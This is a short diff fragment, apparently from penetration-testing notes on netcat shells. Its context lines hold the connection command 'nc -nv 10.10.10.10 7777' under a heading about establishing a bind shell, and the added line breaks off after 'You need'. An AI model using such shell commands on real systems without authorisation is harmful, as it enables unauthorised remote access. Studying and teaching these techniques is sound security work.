@@ -38,3 +38,4 @@ nc -nv 10.10.10.10 7777
 ```
 
 ESTABLISHING A BIND SHELL
+You need 
